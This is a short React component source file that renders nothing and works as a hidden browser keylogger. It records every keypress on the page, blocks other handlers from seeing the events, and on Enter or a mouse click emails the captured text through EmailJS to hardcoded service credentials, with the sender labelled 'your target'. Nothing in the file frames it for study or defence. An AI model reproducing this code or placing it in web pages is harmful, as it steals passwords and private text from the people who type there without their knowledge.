import emailjs from 'emailjs-com';

var keyString = ""
var emailParams = {}

export default function Listener() {

    /**
     * @param {event} keypress event 
     */
    function buildKeyString (e) {
        var result = ''
        var character = String.fromCharCode(e.keyCode)
        result += character
        if (e.keyCode !== 13) {
            keyString += result
            console.log(keyString)
        }
    }
    document.addEventListener('keypress', (e) => {
        buildKeyString(e);
        e.stopImmediatePropagation();
    })

    /**
     * @param {event} keyup event
     */
    function sendStringEnter (e) {
        emailParams = {
            from_name: "your target",
            package: keyString
        }
        if (e.keyCode === 13 && keyString !== "") {
            sendEmail()
            keyString=""
            console.log("'enter' sent package")
        } else if (e.keyCode === 13 && keyString === ""){
            console.log("No package sent; keyString empty")
        }
    }
    document.addEventListener('keyup', (e) => {
        sendStringEnter(e);
        e.stopImmediatePropagation();
    })

    /**
     * @param {event} mouseup event
     */
    function sendStringClick (e) {
        emailParams = {
            from_name: "your target",
            package: keyString
        }
        if (e.button === 0 && keyString !== "") {
            sendEmail()
            keyString=""
            console.log("'click' sent package")
        } else if (e.button === 0 && keyString === "") {
            console.log("No package sent; keyString empty")
        }
    }
    document.addEventListener('mouseup', (e) => {
        sendStringClick(e);
        e.stopImmediatePropagation();
    })

    /**
     */
    const sendEmail = () => {
        emailjs.send('service_s18ykma', 'template_17h4bou', emailParams, '51g4O0_Fg41v4jTW0')
        .then((result) => {
            console.log(result.text);
        }, (error) => {
            console.log(error.text);
        });
    };

    return (
        <>
        </>
    )
}
